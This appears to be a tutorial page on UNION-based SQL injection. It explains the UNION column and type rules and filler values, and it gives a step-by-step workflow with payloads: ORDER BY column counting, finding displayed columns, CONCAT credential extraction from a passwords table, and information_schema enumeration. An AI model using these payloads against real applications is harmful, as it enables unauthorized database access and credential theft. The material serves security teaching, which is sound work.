# Union Clause

The UNION clause is the most powerful tool for data extraction in SQL injection. Where OR-based injection manipulates query logic to bypass authentication, UNION injection appends an entirely new SELECT statement to the original query, allowing data from any table in the database to be retrieved and displayed in the application's response.

***

## How UNION Works

UNION combines the result sets of two SELECT statements into a single output:

```sql
SELECT code, city FROM ports
UNION
SELECT Ship, city FROM ships;
```

Result:
```
CN SHA    | Shanghai
SG SIN    | Singapore
ZZ-21     | Shenzhen
Morrison  | New York
```

Both queries' rows appear together in one output. In an injection context, this means the attacker's injected SELECT runs alongside the application's original SELECT, and both sets of results appear on the page.

***

## The Two Rules for Valid UNION Queries

**Rule 1: Equal number of columns**

Both SELECT statements must return the same number of columns. Mismatched column counts produce an immediate error:

```sql
SELECT city FROM ports UNION SELECT Ship, city FROM ships;
-- ERROR 1222: The used SELECT statements have a different number of columns
```

**Rule 2: Compatible data types**

Each column position must have compatible types between the two queries. Strings cannot be placed in numeric columns and vice versa. Using `NULL` as a filler sidesteps this entirely because NULL is compatible with every data type.

***

## Handling Column Count Mismatches

The original application query rarely has the exact number of columns you need to extract. Pad the injected SELECT with placeholder values to match the count:

```sql
-- Original query returns 4 columns, you only need username
-- Inject: ' UNION SELECT username, 2, 3, 4 FROM passwords--

SELECT * FROM products WHERE product_id='1'
UNION SELECT username, 2, 3, 4 FROM passwords--'
```

Output:
```
product_1  | product_2 | product_3 | product_4
-----------+-----------+-----------+----------
admin      | 2         | 3         | 4
```

Using numbers (`1`, `2`, `3`, `4`) as fillers has two advantages: they satisfy the integer type requirement for numeric columns, and they appear in the output indicating which column position each value occupies, which is useful for identifying which columns are displayed on the page.

***

## Filler Values and When to Use Each

| Filler | Use Case |
|--------|---------|
| `1`, `2`, `3` | Numeric column positions, easy to track |
| `'a'`, `'b'` | String columns where integers cause type errors |
| `NULL` | Universal, works for any data type, safest option |

For most real-world injection where column types are unknown, `NULL` is the safest filler:

```sql
' UNION SELECT username, NULL, NULL, NULL FROM passwords--
```

***

## Extracting Multiple Values in One Column

When only one column position is visible in the application's output, you can concatenate multiple values into that single column using MySQL's `CONCAT()` or the concat operator:

```sql
' UNION SELECT CONCAT(username, ':', password), NULL FROM passwords--
```

Output in the single visible column:
```
admin:p@ssw0rd
john:john123!
```

The separator (`:` in this case) makes the output readable and separates the two values when parsed.

***

## The Full UNION Injection Workflow

```
Step 1: Confirm injection point
  → Submit ' and observe SQL error or behaviour change

Step 2: Determine column count
  → ' ORDER BY 1--   (success)
  → ' ORDER BY 2--   (success)
  → ' ORDER BY 3--   (error: 3 columns confirmed)

Step 3: Find displayed columns
  → ' UNION SELECT 1,2--
  → Observe which numbers appear on the page

Step 4: Extract target data
  → Replace the visible number with your target column
  → ' UNION SELECT username,2 FROM passwords--

Step 5: Enumerate database structure
  → Query information_schema for table/column names
  → ' UNION SELECT table_name,2 FROM information_schema.tables--
```

***

## Practical Example: Four-Column Table

If the original query is `SELECT * FROM products WHERE id='INPUT'` and the products table has four columns:

```sql
-- Step 1: Find column count
' ORDER BY 4--   -- success
' ORDER BY 5--   -- error: confirmed 4 columns

-- Step 2: Find visible columns (which numbers appear on page)
' UNION SELECT 1,2,3,4--
-- Assume columns 2 and 3 are displayed

-- Step 3: Extract credentials
' UNION SELECT 1,username,password,4 FROM passwords--
```

The application renders columns 2 and 3 of the result, so username and password appear exactly where those numbers were previously showing. This is why tracking column positions with numbers in the filler step is valuable before moving to the extraction step.
